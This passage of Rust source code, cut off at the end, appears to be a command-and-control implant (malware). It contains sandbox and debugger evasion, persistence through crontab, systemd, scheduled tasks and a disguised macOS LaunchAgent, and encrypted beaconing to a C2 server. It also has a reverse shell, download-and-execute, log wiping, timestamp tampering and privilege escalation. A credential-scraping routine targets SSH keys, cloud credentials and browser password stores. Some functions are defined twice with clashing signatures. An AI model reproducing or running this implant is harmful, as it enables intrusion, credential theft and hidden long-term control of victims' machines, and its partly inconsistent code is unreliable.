    let shell_command = get_shell_command("-c");
    let output = Command::new(&shell_command[0])
        .args(&shell_command[1..])
        .arg(cmd)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_lowercase())
        .unwrap_or_default();

    DEBUG_TOOLS
        .iter()
        .find(|(os, _)| *os == std::env::consts::OS)
        .map(|(_, tools)| tools.iter().any(|tool| output.contains(tool)))
        .unwrap_or(false)
}

fn is_sandbox_environment(lazyconf: &LazyDataType) -> bool {
    if num_cpus::get() <= 1 {
        return true;
    }

    let mut mem_stats = meminfo::MemInfo::new().unwrap();
    if mem_stats.total < 6 * 1024 * 1024 * 1024 {
        return true;
    }

    if cfg!(target_os = "linux") {
        let has_virtual_disk = Path::new("/sys/block/vda").exists() || Path::new("/dev/vda").exists();
        if has_virtual_disk {
            if lazyconf.debug_implant == "True" {
                println!("[DEBUG] Possible sandbox: Virtual disk detected");
            }
            if let Ok(data) = fs::read_to_string("/proc/self/status") {
                if data.contains("TracerPid:") {
                    return true;
                }
            }
        }
    }
    false
}

fn init_encryption_context(key_hex: &str) -> Option<PacketEncryptionContext> {
    let key_bytes = hex::decode(key_hex).ok()?;
    Some(PacketEncryptionContext {
        aes_key: Aes256Key { key: key_bytes },
        valid: true,
        enabled: true,
    })
}

fn init_stealth_mode(lazyconf: &LazyDataType) {
    let stealth_enabled = STEALTH.eq_ignore_ascii_case("true");
    STEALTH_MODE_ENABLED.store(stealth_enabled, Ordering::SeqCst);
    if lazyconf.debug_implant == "True" {
        println!("[INFO] Stealth mode initialized as {}", if stealth_enabled { "ENABLED" } else { "DISABLED" });
    }
}

fn handle_stealth_command(command: &str, lazyconf: &LazyDataType) {
    match command {
        "stealth_on" => {
            STEALTH_MODE_ENABLED.store(true, Ordering::SeqCst);
            if lazyconf.debug_implant == "True" {
                println!("[INFO] Stealth mode ENABLED by command");
            }
        }
        "stealth_off" => {
            STEALTH_MODE_ENABLED.store(false, Ordering::SeqCst);
            if lazyconf.debug_implant == "True" {
                println!("[INFO] Stealth mode DISABLED by command");
            }
        }
        _ => {}
    }
}

fn simulate_legitimate_traffic(lazyconf: &LazyDataType) {
    let client = Client::new();
    loop {
        let user_agent = random_select_str(&USER_AGENTS);
        let mut headers = HeaderMap::new();
        for (k, v) in HEADERS.iter() {
            headers.insert(*k, HeaderValue::from_str(v).unwrap());
        }
        headers.insert("User-Agent", HeaderValue::from_str(&user_agent).unwrap());

        let url = random_select_str(&URLS);
        match client.get(&url).headers(headers).send() {
            Ok(resp) if resp.status().is_success() => {
                if lazyconf.debug_implant == "True" {
                    println!("[INFO] Simulation success: {}", url);
                }
            }
            Ok(resp) => {
                if lazyconf.debug_implant == "True" {
                    eprintln!("[-] Error in the matrix: {}", resp.status());
                }
            }
            Err(e) => {
                if lazyconf.debug_implant == "True" {
                    eprintln!("[!] Error during simulation: {}", e);
                }
            }
        }
        let sleep_duration = rand::thread_rng().gen_range(30..=60);
        thread::sleep(Duration::from_secs(sleep_duration));
    }
}

fn global_recover() {
    if let Some(e) = std::panic::take_hook() {
        eprintln!("[RECOVER] Critical error: {:?}", e);
        restart_client();
    }
}

fn restart_client() {
    let executable = std::env::current_exe().unwrap();
    let _ = Command::new(executable).spawn();
    std::process::exit(1);
}

fn ensure_crontab_persistence(lazyconf: &LazyDataType) -> Result<(), String> {
    let executable = std::env::current_exe()
        .map_err(|e| format!("failed to get executable path: {}", e))?;
    let cron_cmd = format!("* * * * * {}\n", executable.display());
    let cron = format!("echo '{}' | crontab -", cron_cmd);
    let shell_command = get_shell_command("-c");
    let (output, err) = execute_command_with_retry(&shell_command, &cron)?;
    if let Some(e) = err {
        if lazyconf.debug_implant == "True" {
            eprintln!("[ERROR] Failed to set crontab persistence: {}, output: {}", e, output);
        }
        return Err(format!("failed to set crontab persistence: {}", e));
    }
    if lazyconf.debug_implant == "True" {
        println!("[INFO] Successfully set crontab persistence: {}", cron_cmd);
    }
    Ok(())
}

fn ensure_persistence_macos() -> Result<(), String> {
    let home_dir = dirs::home_dir().ok_or("failed to get home directory")?;
    let plist_path = home_dir.join("Library/LaunchAgents/com.system.maintenance.plist");
    let executable = std::env::current_exe()
        .map_err(|e| format!("failed to get executable path: {}", e))?;
    let plist_content = format!(
        r#"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.maintenance</string>
    <key>ProgramArguments</key>
    <array>
        <string>{}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"#,
        executable.display()
    );
    fs::write(&plist_path, plist_content)
        .map_err(|e| format!("failed to write plist file: {}", e))?;
    Ok(())
}

fn ensure_persistence(lazyconf: &LazyDataType) -> Result<(), String> {
    let executable = std::env::current_exe()
        .map_err(|e| format!("failed to get executable path: {}", e))?;

    if cfg!(target_os = "windows") {
        let task_name = "SystemMaintenanceTask";
        let task_cmd = format!(r#"schtasks /create /tn "{}" /tr "{}" /sc daily /f"#, task_name, executable.display());
        let status = Command::new("cmd")
            .args(&["/C", &task_cmd])
            .status()
            .map_err(|e| format!("failed to create scheduled task: {}", e))?;
        if !status.success() {
            return Err("failed to create scheduled task".to_string());
        }
    } else if cfg!(target_os = "linux") {
        let service_content = format!(
            r#"
[Unit]
Description=System Maintenance Service

[Service]
ExecStart={}
Restart=always
User={}

[Install]
WantedBy=multi-user.target
"#,
            executable.display(),
            env::var("USER").unwrap_or_default()
        );
        let service_path = "/etc/systemd/system/system-maintenance.service";
        fs::write(service_path, service_content)
            .map_err(|e| format!("failed to write service file: {}", e))?;
        ensure_crontab_persistence(lazyconf)?;
        let status = Command::new("systemctl")
            .args(&["enable", "system-maintenance"])
            .status()
            .map_err(|e| format!("failed to enable systemd service: {}", e))?;
        if !status.success() {
            return Err("failed to enable systemd service".to_string());
        }
    } else if cfg!(target_os = "macos") {
        ensure_persistence_macos()?;
    }
    Ok(())
}

fn self_destruct(lazyconf: &LazyDataType) {
    if lazyconf.debug_implant == "True" {
        println!("[INFO] Initiating self-destruct");
    }
    let executable = std::env::current_exe().unwrap();
    fs::remove_file(&executable).ok();
    if cfg!(target_os = "linux") {
        Command::new("systemctl").args(&["disable", "system-maintenance"]).status().ok();
        Command::new("crontab").arg("-r").status().ok();
        fs::remove_file("/etc/systemd/system/system-maintenance.service").ok();
    }
    std::process::exit(0);
}

fn capture_network_config(lazyconf: &LazyDataType) -> Result<(), String> {
    thread::spawn(move || {
        let cmd = if cfg!(target_os = "windows") {
            "ipconfig /all"
        } else {
            "ifconfig || ip addr"
        };
        let shell_command = get_shell_command("-c");
        let (output, err) = execute_command_with_retry(&shell_command, cmd).unwrap_or_default();
        if let Some(e) = err {
            if lazyconf.debug_implant == "True" {
                eprintln!("[ERROR] Failed to capture network config: {}", e);
            }
            return;
        }
        let temp_file = if cfg!(target_os = "windows") {
            format!("{}\\netconfig.txt", env::temp_dir().to_string_lossy())
        } else {
            "/tmp/netconfig.txt".to_string()
        };
        if let Err(e) = fs::write(&temp_file, output) {
            if lazyconf.debug_implant == "True" {
                eprintln!("[ERROR] Failed to write network config to file: {}", e);
            }
            return;
        }
        upload_file(&temp_file);
        if lazyconf.debug_implant == "True" {
            println!("[INFO] Network configuration captured and uploaded");
        }
    });
    Ok(())
}

fn encrypt_packet(ctx: &PacketEncryptionContext, packet: &[u8]) -> Result<Vec<u8>, String> {
    let cipher = Aes256::new_from_slice(&ctx.aes_key.key)
        .map_err(|e| format!("failed to create cipher: {}", e))?;
    let mut iv = vec![0u8; 16];
    rand::thread_rng().fill(&mut iv[..]);
    let mut encrypted = vec![0u8; packet.len()];
    let encryptor = Cfb::<Aes256>::new_from_slices(&ctx.aes_key.key, &iv).unwrap();
    encryptor.encrypt(&mut encrypted, packet);
    let mut result = iv;
    result.extend_from_slice(&encrypted);
    Ok(result)
}

fn send_shell(ip: &str, port: i32) {
    let target = format!("{}:{}", ip, port);
    let mut con = match TcpStream::connect(&target) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Error connecting to {}: {}", target, e);
            return;
        }
    };

    let shell_command = get_shell_command("-i");
    let mut cmd = Command::new(&shell_command[0]);
    for arg in shell_command.iter().skip(1) {
        cmd.arg(arg);
    }
    cmd.stdin(Stdio::piped());
    cmd.stdout(Stdio::piped());
    cmd.stderr(Stdio::piped());

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Error executing shell command on {}: {}", target, e);
            return;
        }
    };

    let mut stdin = child.stdin.take().unwrap();
    let mut stdout = child.stdout.take().unwrap();
    let mut stderr = child.stderr.take().unwrap();

    thread::spawn(move || {
        io::copy(&mut con, &mut stdin).unwrap();
    });
    thread::spawn(move || {
        io::copy(&mut stdout, &mut con).unwrap();
    });
    io::copy(&mut stderr, &mut con).unwrap();

    let _ = child.wait();
}

fn decrypt_packet(ctx: &PacketEncryptionContext, encrypted_data: &[u8]) -> Result<Vec<u8>, String> {
    if encrypted_data.len() < 16 {
        return Err("encrypted data too short".to_string());
    }
    let iv = &encrypted_data[..16];
    let data = &encrypted_data[16..];
    let cipher = Aes256::new_from_slice(&ctx.aes_key.key)
        .map_err(|e| format!("failed to create cipher: {}", e))?;
    let mut decrypted = vec![0u8; data.len()];
    let decryptor = Cfb::<Aes256>::new_from_slices(&ctx.aes_key.key, iv).unwrap();
    decryptor.decrypt(&mut decrypted, data);
    Ok(decrypted)
}

fn send_request(url: &str, method: &str, body: &str, file_path: &str) -> Result<reqwest::blocking::Response, String> {
    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    let mut req_builder = client.request(method.parse().unwrap(), url);
    let user_agent = random_select_str(&USER_AGENTS);
    req_builder = req_builder.header("User-Agent", user_agent);

    if !file_path.is_empty() {
        let file = File::open(file_path)
            .map_err(|e| format!("file open error: {}", e))?;
        let part = multipart::Part::stream(file)
            .file_name(Path::new(file_path).file_name().unwrap().to_string_lossy().into_owned());
        let form = multipart::Form::new().part("file", part);
        req_builder = req_builder.multipart(form);
    } else {
        let ctx = ENCRYPTION_CTX.read().unwrap();
        let ctx = ctx.as_ref().ok_or("encryption context not initialized")?;
        let encrypted_body = encrypt_packet(ctx, body.as_bytes())?;
        let base64_body = general_purpose::STANDARD.encode(&encrypted_body);
        req_builder = req_builder.header("Content-Type", "text/plain").body(base64_body);
    }

    let resp = req_builder
        .send()
        .map_err(|e| format!("request failed: {}", e))?;

    if !resp.status().is_success() {
        let error_body = resp.text().unwrap_or_default();
        return Err(format!("server error {}: {}", resp.status(), error_body));
    }

    let raw_response = resp.text().map_err(|e| format!("response read error: {}", e))?;
    let encrypted_response = general_purpose::STANDARD.decode(&raw_response)
        .map_err(|e| format!("base64 decode error: {}", e))?;
    let ctx = ENCRYPTION_CTX.read().unwrap();
    let decrypted_response = decrypt_packet(ctx.as_ref().unwrap(), &encrypted_response)?;
    Ok(reqwest::Response::from_bytes(decrypted_response))
}

fn retry_request(url: &str, method: &str, body: &str, file_path: &str) -> Result<(), String> {
    for i in 0..MAX_RETRIES {
        match send_request(url, method, body, file_path) {
            Ok(resp) => return Ok(resp),
            Err(e) => {
                eprintln!("[RETRY] Attempt {}/{}: {}", i + 1, MAX_RETRIES, e);
                thread::sleep(Duration::from_secs(SLEEP));
            }
        }
    }
    Err(format!("max retries reached after {} attempts", MAX_RETRIES))
}

fn execute_command_with_retry(shell_command: &[String], command: &str) -> Result<(String, Option<String>), String> {
    for i in 0..MAX_RETRIES {
        let mut cmd = Command::new(&shell_command[0]);
        for arg in shell_command.iter().skip(1) {
            cmd.arg(arg);
        }
        cmd.arg(command);
        let output = cmd.output()
            .map_err(|e| format!("command failed: {}", e))?;
        let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
        let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
        let combined_output = format!("{}\n{}", stdout, stderr);
        if output.status.success() {
            return Ok((combined_output, None));
        }
        eprintln!("[CMD RETRY] Attempt {}/{}: {}", i + 1, MAX_RETRIES, stderr);
        thread::sleep(Duration::from_secs(2));
    }
    Ok((String::new(), Some(format!("command failed after {} attempts", MAX_RETRIES))))
}

fn get_shell_command(interactive: &str) -> Vec<String> {
    if cfg!(target_os = "windows") {
        if which::which("powershell").is_ok() {
            vec![String::from("powershell"), String::from("-Command")]
        } else {
            vec![String::from("cmd"), String::from("/C")]
        }
    } else {
        if which::which("bash").is_ok() {
            vec![String::from("bash"), String::from(interactive)]
        } else {
            vec![String::from("sh"), String::from("-c")]
        }
    }
}

fn calculate_jittered_sleep(base_sleep: u64, min_jitter_percentage: f64, max_jitter_percentage: f64) -> Duration {
    let jitter_percentage = min_jitter_percentage + rand::thread_rng().gen::<f64>() * (max_jitter_percentage - min_jitter_percentage);
    let jitter_range = base_sleep as f64 * jitter_percentage;
    let jitter = rand::thread_rng().gen::<f64>() * jitter_range;
    Duration::from_secs_f64((base_sleep as f64 + jitter) / 1000.0)
}

#[tokio::main]
async fn main() {
    let base_sleep_time = Duration::from_secs(*SLEEP);
    let min_jitter_percentage = 0.1;
    let max_jitter_percentage = 0.3;
    let key_hex = "{key}";
    let mut lazyconf = LazyDataType::default();
    let mut current_port_scan_results = HashMap::new();
    let url = format!("{}/config.json", C2_URL);

    if let Err(e) = read_json_from_url::<LazyDataType>(&url) {
        println!("Error: {}", e);
        return;
    }

    if lazyconf.debug_implant == "True" {
        println!("[INFO] Reading JSON from URL: {}", url);
    }

    init_stealth_mode(&lazyconf);
    {
        let mut ec = ENCRYPTION_CTX.write().unwrap();
        *ec = init_encryption_context(&key_hex);
    }

    if ENCRYPTION_CTX.read().unwrap().is_none() {
        if lazyconf.debug_implant == "True" {
            eprintln!("[FATAL] Failed to initialize encryption");
        }
        thread::sleep(Duration::from_secs(30));
        restart_client();
    }

    let shell_command = get_shell_command("-c");
    let _ = ensure_persistence(&lazyconf);

    loop {
        let shell_command = shell_command.clone();
        let lazy_conf = lazyconf.clone();
        let ctx = tokio::sync::oneshot::channel::<String>();
        let current_port_scan_results_clone = current_port_scan_results.clone();

        tokio::spawn(async move {
            let resp = retry_request(
                &format!("{}{}{}", C2_URL, MALEABLE, CLIENT_ID),
                "GET",
                "",
                "",
            );

            if let Err(e) = resp {
                if lazy_conf.debug_implant == "True" {
                    eprintln!("[ERROR] Main request failed: {}", e);
                }
                return;
            }

            let body = resp.unwrap().text().unwrap_or_default();
            let command = body.trim();
            if command.is_empty() {
                return;
            }

            handle_stealth_command(&command, &lazy_conf);

            if STEALTH_MODE_ENABLED.load(Ordering::SeqCst) {
                if lazy_conf.debug_implant == "True" {
                    println!("[DEBUG] Stealth mode is active. Skipping activity.");
                }
                return;
            }

            if lazy_conf.debug_implant == "True" {
                println!("[INFO] Simulation Started...");
            }
            thread::spawn(|| simulate_legitimate_traffic(&lazy_conf));

            if lazy_conf.debug_implant == "True" {
                println!("[INFO] Execution Simulation.");
            }

            if check_debuggers(&lazy_conf) {
                if lazy_conf.debug_implant == "True" {
                    println!("[INFO] We are under debugger");
                }
            } else if lazy_conf.debug_implant == "True" {
                println!("[INFO] We aren't under debugger.");
            }

            if is_vm_by_mac() {
                if lazy_conf.debug_implant == "True" {
                    println!("[INFO] This is a VM");
                }
            } else if lazy_conf.debug_implant == "True" {
                println!("[INFO] This is not a VM");
            }

            if is_sandbox_environment(&lazy_conf) {
                if lazy_conf.debug_implant == "True" {
                    println!("[INFO] This is a sandbox environment");
                }
            } else if lazy_conf.debug_implant == "True" {
                println!("[INFO] This is not a sandbox environment.");
            }

            if !command.contains("stealth") {
                match command {
                    cmd if cmd.starts_with("download:") => {
                        handle_download(&ctx.0, cmd);
                    }
                    cmd if cmd.starts_with("upload:") => {
                        handle_upload(&ctx.0, cmd);
                    }
                    cmd if cmd.starts_with("rev:") => {
                        tokio::spawn(async move {
                            send_shell(&LHOST, lazy_conf.reverse_shell_port);
                        });
                    }
                    cmd if cmd.starts_with("exfil:") => {
                        handle_exfiltrate(&ctx.0, cmd, &lazy_conf);
                    }
                    cmd if cmd.starts_with("download_exec:") => {
                        let url = cmd.strip_prefix("download_exec:").unwrap_or("");
                        tokio::spawn(async move {
                            download_and_execute(url, &lazy_conf);
                        });
                    }
                    cmd if cmd.starts_with("obfuscate:") => {
                        let file_path = cmd.strip_prefix("obfuscate:").unwrap_or("");
                        if file_path.is_empty() {
                            if lazy_conf.debug_implant == "True" {
                                eprintln!("[ERROR] Invalid obfuscate command format, expected obfuscate:<file_path>");
                            }
                        } else if let Err(e) = obfuscate_file_timestamps(&lazy_conf, file_path) {
                            if lazy_conf.debug_implant == "True" {
                                eprintln!("[ERROR] Failed to obfuscate timestamps: {}", e);
                            }
                        }
                    }
                    cmd if cmd.starts_with("cleanlogs:") => {
                        if let Err(e) = clean_system_logs(&lazy_conf) {
                            if lazy_conf.debug_implant == "True" {
                                eprintln!("[ERROR] Failed to clean system logs: {}", e);
                            }
                        }
                    }
                    cmd if cmd.starts_with("discover:") => {
                        static ONCE: std::sync::Once = std::sync::Once::new();
                        ONCE.call_once(|| {
                            discover_local_hosts(&lazy_conf);
                        });
                    }
                    cmd if cmd.starts_with("adversary:") => {
                        if let Err(e) = handle_adversary(&ctx.0, cmd, &lazy_conf, &current_port_scan_results_clone) {
                            if lazy_conf.debug_implant == "True" {
                                eprintln!("[ERROR] Failed to handle adversary command: {}", e);
                            }
                        }
                    }
                    cmd if cmd.starts_with("softenum:") => {
                        if let Ok(soft) = get_useful_software() {
                            if lazy_conf.debug_implant == "True" {
                                println!("[INFO] Useful software found:");
                                for s in soft {
                                    if !s.is_empty() {
                                        println!(" - {}", s);
                                    }
                                }
                            }
                        }
                    }
                    cmd if cmd.starts_with("netconfig:") => {
                        if let Err(e) = capture_network_config(&lazy_conf) {
                            if lazy_conf.debug_implant == "True" {
                                eprintln!("[ERROR] Failed to capture network config: {}", e);
                            }
                        } else if lazy_conf.debug_implant == "True" {
                            println!("[INFO] Network configuration captured and uploaded");
                        }
                    }
                    cmd if cmd.starts_with("escalatelin:") => {
                        try_privilege_escalation(&lazy_conf);
                    }
                    cmd if cmd.starts_with("proxy:") => {
                        let parts: Vec<&str> = cmd.trim_prefix("proxy:").unwrap_or("").split(':').collect();
                        if parts.len() != 4 {
                            if lazy_conf.debug_implant == "True" {
                                eprintln!("[ERROR] Invalid proxy command format, expected proxy:<listenIP>:<listenPort>:<targetIP>:<targetPort>");
                            }
                            let _ = retry_request(
                                &format!("{}{}{}", C2_URL, MALEABLE, CLIENT_ID),
                                "POST",
                                "{\"error\": \"Invalid proxy command format\"}",
                                "",
                            );
                        } else {
                            let listen_addr = format!("{}:{}", parts[0], parts[1]);
                            let target_addr = format!("{}:{}", parts[2], parts[3]);
                            if let Err(e) = start_proxy(&lazy_conf, &listen_addr, &target_addr) {
                                if lazy_conf.debug_implant == "True" {
                                    eprintln!("[ERROR] Failed to start proxy: {}", e);
                                }
                                let _ = retry_request(
                                    &format!("{}{}{}", C2_URL, MALEABLE, CLIENT_ID),
                                    "POST",
                                    &format!("{{\"error\": \"Failed to start proxy: {}\"}}", e),
                                    "",
                                );
                            } else {
                                if lazy_conf.debug_implant == "True" {
                                    println!("[INFO] Proxy started on {} to {}", listen_addr, target_addr);
                                }
                                let _ = retry_request(
                                    &format!("{}{}{}", C2_URL, MALEABLE, CLIENT_ID),
                                    "POST",
                                    &format!("{{\"message\": \"Proxy started on {} to {}\"}}", listen_addr, target_addr),
                                    "",
                                );
                            }
                        }
                    }
                    cmd if cmd.starts_with("stop_proxy:") => {
                        let listen_addr = cmd.strip_prefix("stop_proxy:").unwrap_or("");
                        if listen_addr.is_empty() {
                            if lazy_conf.debug_implant == "True" {
                                eprintln!("[ERROR] Invalid stop_proxy command format, expected stop_proxy:<listenAddr>");
                            }
                        } else if let Err(e) = stop_proxy(listen_addr, &lazy_conf) {
                            if lazy_conf.debug_implant == "True" {
                                eprintln!("[ERROR] Failed to stop proxy: {}", e);
                            }
                        } else if lazy_conf.debug_implant == "True" {
                            println!("[INFO] Proxy stopped on {}", listen_addr);
                        }
                    }
                    cmd if cmd.starts_with("portscan:") => {
                        let timeout = Duration::from_secs(2);
                        current_port_scan_results = port_scanner(
                            &format!("{}, {}", DISCOVERED_LIVE_HOSTS.read().unwrap(), lazy_conf.rhost),
                            &lazy_conf.beacon_scan_ports,
                            timeout,
                        );
                        let mut results_ref = RESULTS_PORTSCAN.write().unwrap();
                        *results_ref = current_port_scan_results.clone();
                        for (ip, open_ports) in &current_port_scan_results {
                            if !open_ports.is_empty() {
                                if lazy_conf.debug_implant == "True" {
                                    println!("IP {} has open ports: {:?}", ip, open_ports);
                                }
                            } else if lazy_conf.debug_implant == "True" {
                                println!("IP {} has no open ports", ip);
                            }
                        }
                    }
                    cmd if cmd.starts_with("compressdir:") => {
                        let input_dir = cmd.strip_prefix("compressdir:").unwrap_or("");
                        if input_dir.is_empty() {
                            if lazy_conf.debug_implant == "True" {
                                eprintln!("[ERROR] Invalid compressdir command format, expected compressdir:<directory_path>");
                            }
                        } else {
                            let dir_name = Path::new(input_dir).file_name().unwrap().to_string_lossy();
                            let current_time = chrono::Local::now().format("%Y%m%d").to_string();
                            let output_file_name = format!("{}_{}_{}.tar.gz", dir_name, CLIENT_ID, current_time);
                            let output_file_path = Path::new(input_dir).parent().unwrap().join(&output_file_name);

                            if !Path::new(input_dir).exists() {
                                if lazy_conf.debug_implant == "True" {
                                    eprintln!("[ERROR] Directory not found: {}", input_dir);
                                }
                            } else if let Err(e) = compress_gzip_dir(input_dir, &output_file_path.to_string_lossy(), &lazy_conf) {
                                if lazy_conf.debug_implant == "True" {
                                    eprintln!("[ERROR] Failed to compress directory '{}': {}", input_dir, e);
                                }
                            } else if lazy_conf.debug_implant == "True" {
                                println!("[INFO] Successfully compressed directory to: {}", output_file_path.display());
                            }
                        }
                    }
                    cmd if cmd.contains("terminate:") => {
                        if lazy_conf.debug_implant == "True" {
                            println!("[INFO] terminate command");
                        }
                        self_destruct(&lazy_conf);
                    }
                    cmd => {
                        handle_command(&ctx.0, cmd, &shell_command, &lazy_conf, &current_port_scan_results);
                    }
                }
            }
        });

        let sleep_time = calculate_jittered_sleep(SLEEP * 1000, min_jitter_percentage, max_jitter_percentage);
        tokio::time::sleep(sleep_time).await;
    }
}

fn handle_download(ctx: &str, command: &str) -> Result<(), String> {
    let file_path = command.strip_prefix("download:").unwrap_or("");
    let file_url = format!("{}{}/download/{}", C2_URL, MALEABLE, file_path);
    let resp = retry_request(&file_url, "GET", "", "")?;
    let file_data = resp.text().map_err(|e| format!("failed to read downloaded file: {}", e))?;
    fs::write(Path::new(file_path).file_name().unwrap_or_default(), file_data)
        .map_err(|e| format!("failed to write file: {}", e))?;
    Ok(())
}

fn handle_upload(ctx: &str, command: String) -> Result<(), String> {
    let file_path = command.strip_prefix("upload:").unwrap_or("");
    let resp = retry_request(&format!("{}{}/upload", C2_URL, MALEABLE), "POST", "", file_path)?;
    if !resp.status().is_success() {
        return Err(format!("Upload failed with status: {}", resp.status()));
    }
    Ok(())
}

fn handle_command(
    ctx: &tokio::sync::oneshot::Sender<()>,
    command: &str,
    shell_command: &[String],
    lazyconf: &LazyDataType,
    current_port_scan_results: &HashMap<String, Vec<i32>>,
) {
    let (output, err) = execute_command_with_retry(shell_command, command).unwrap_or((String::new(), Some("command execution failed".to_string())));
    let combined_output = if let Some(e) = err {
        if lazyconf.debug_implant == "True" {
            eprintln!("[ERROR] Command execution failed: {}, error: {}", command, e);
        }
        format!("{}\nError: {}", output, e)
    } else {
        if lazyconf.debug_implant == "True" {
            println!("[INFO] Command executed successfully: {}", command);
        }
        output
    };

    let pid = std::process::id();
    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().into_owned())
        .unwrap_or_default();
    let ips = get_ips();
    let current_user = whoami::username();

    let json_data = serde_json::json!({
        "output": combined_output,
        "client": std::env::consts::OS,
        "command": command,
        "pid": pid.to_string(),
        "hostname": hostname,
        "ips": ips.join(", "),
        "user": current_user,
        "discovered_ips": DISCOVERED_LIVE_HOSTS.read().unwrap().clone(),
        "result_portscan": current_port_scan_results,
    });

    if lazyconf.debug_implant == "True" {
        println!("[INFO] Sending JSON data to C2:\n{}", serde_json::to_string_pretty(&json_data).unwrap());
    }

    if let Err(e) = retry_request(
        &format!("{}{}{}", C2_URL, MALEABLE, CLIENT_ID),
        "POST",
        &json_data.to_string(),
        "",
    ) {
        if lazyconf.debug_implant == "True" {
            eprintln!("[ERROR] Failed to send command output to C2: {}", e);
        }
    }

    let _ = ctx.send(());
}

fn get_ips() -> Vec<String> {
    pnet::datalink::interfaces()
        .into_iter()
        .filter(|iface| iface.is_up() && !iface.is_loopback())
        .flat_map(|iface| {
            iface.ips.into_iter().filter_map(|ip| {
                if let IpAddr::V4(ipv4) = ip.ip() {
                    Some(ipv4.to_string())
                } else {
                    None
                }
            })
        })
        .collect()
}

fn handle_download(ctx: &tokio::sync::oneshot::Sender<()>, command: &str) -> Result<(), String> {
    let file_path = command.strip_prefix("download:").unwrap_or("");
    if file_path.is_empty() {
        return Err("Invalid download command format".to_string());
    }
    let file_url = format!("{}{}/download/{}", C2_URL, MALEABLE, file_path);
    let resp = retry_request(&file_url, "GET", "", "")?;
    let file_data = resp
        .bytes()
        .map_err(|e| format!("Failed to read downloaded file: {}", e))?;
    let dest_path = Path::new(file_path)
        .file_name()
        .ok_or("Invalid file path")?
        .to_string_lossy();
    fs::write(&dest_path, file_data).map_err(|e| format!("Failed to write file {}: {}", dest_path, e))?;
    if lazyconf.debug_implant == "True" {
        println!("[INFO] Downloaded file to {}", dest_path);
    }
    let _ = ctx.send(());
    Ok(())
}

fn handle_upload(ctx: &tokio::sync::oneshot::Sender<()>, command: &str) -> Result<(), String> {
    let file_path = command.strip_prefix("upload:").unwrap_or("");
    if file_path.is_empty() {
        return Err("Invalid upload command format".to_string());
    }
    if !Path::new(file_path).exists() {
        return Err(format!("File not found: {}", file_path));
    }
    let resp = retry_request(
        &format!("{}{}/upload", C2_URL, MALEABLE),
        "POST",
        "",
        file_path,
    )?;
    if !resp.status().is_success() {
        return Err(format!("Upload failed with status: {}", resp.status()));
    }
    if lazyconf.debug_implant == "True" {
        println!("[INFO] Uploaded file: {}", file_path);
    }
    let _ = ctx.send(());
    Ok(())
}

fn handle_exfiltrate(ctx: &tokio::sync::oneshot::Sender<()>, command: &str, lazyconf: &LazyDataType) {
    if lazyconf.debug_implant == "True" {
        println!("[INFO] Executing file scraping...");
    }

    let home_dir = dirs::home_dir().unwrap_or_default();
    let sensitive_files = [
        ".bash_history", ".ssh/id_rsa", ".ssh/id_dsa", ".ssh/id_ecdsa", ".ssh/id_ed25519",
        ".ssh/authorized_keys", ".aws/credentials", ".aws/config*",
        ".zsh_history", ".config/fish/fish_history", ".gnupg/secring.gpg", ".gnupg/pubring.gpg",
        ".password-store/*", ".keepassxc/*.kdbx", "Documents/*.kdbx", "Downloads/github-recovery-codes.txt",
        ".config/google-chrome/Default/Login Data", ".mozilla/firefox/*/key4.db",
        ".mozilla/firefox/*/logins.json", ".config/microsoft/Edge/Default/Login Data",
        "Library/Application Support/BraveSoftware/*/Login Data",
        "Library/Application Support/Google/Chrome/Default/Login Data",
        "~/Library/Safari/Bookmarks.plist", "AppData/Local/Google/Chrome/User Data/Default/Login Data",
        "AppData/Roaming/Mozilla/Firefox/Profiles/*/key4.db", "AppData/Roaming/Mozilla/Firefox/Profiles/*/logins.json",
        "AppData/Local/Microsoft/Edge/User Data/Default/Login Data", ".purple/accounts.xml",
        ".irssi/config", ".mutt/*", ".abook/abook", ".thunderbird/*/prefs.js",
        ".thunderbird/*/Mail/*/*", ".wireshark/recent", ".config/transmission/torrents.json",
        ".wget-hsts", ".git-credentials", ".npmrc", ".yarnrc", ".bundle/config", ".gem/*/credentials",
        ".pypirc", ".ssh/config", "~/.aws/config", "~/.oci/config", "~/.kube/config",
        "~/.docker/config.json", "~/.netrc",
    ]
    .iter()
    .map(|p| home_dir.join(p).to_string_lossy().into_owned())
    .collect::<Vec<_>>();

    let password_patterns = vec![
        Regex::new(r"(?i)password\s*[:=]\s*"?(.+?)"?\s*$").unwrap(),
        Regex::new(r"(?i)passwd\s*[:=]\s*"?(.+?)"?\s*$").unwrap(),
    ];

    let (found_files_tx, found_files_rx) = bounded(10);
    let (error_tx, error_rx) = bounded(5);
    let wg = Arc::new(Mutex::new(0));

    let scan_path = |path: String, wg: Arc<Mutex<i32>>, found_files_tx: Sender<String>, error_tx: Sender<String>| {
        let _guard = scopeguard::guard((), |_| {
            let mut count = wg.lock().unwrap();
            *count -= 1;
        });

        if path.contains('*') {
            match glob::glob(&path) {
                Ok(entries) => {
                    for entry in entries.flatten() {
                        if is_sensitive_file(&entry.to_string_lossy(), &password_patterns) {
                            let _ = found_files_tx.send(entry.to_string_lossy().into_owned());
                        }
                    }
                }
                Err(e) => {
                    let _ = error_tx.send(format!("Error processing glob pattern '{}': {}", path, e));
                }
            }
        } else {
            if is_sensitive_file(&path, &password_patterns) {
                let _ = found_files_tx.send(path);
            }
        }
    };

    for file in sensitive_files {
        let mut count = wg.lock().unwrap();
        *count += 1;
        drop(count);
        let wg = Arc::clone(&wg);
        let found_files_tx = found_files_tx.clone();
        let error_tx = error_tx.clone();
        thread::spawn(move || scan_path(file, wg, found_files_tx, error_tx));
    }

    drop(found_files_tx);
    drop(error_tx);

    thread::spawn(move || {
        while *wg.lock().unwrap() > 0 {
            thread::sleep(Duration::from_millis(100));
        }
        let _ = ctx.send(());
    });

    for found_file in found_files_rx {
        if lazyconf.debug_implant == "True" {
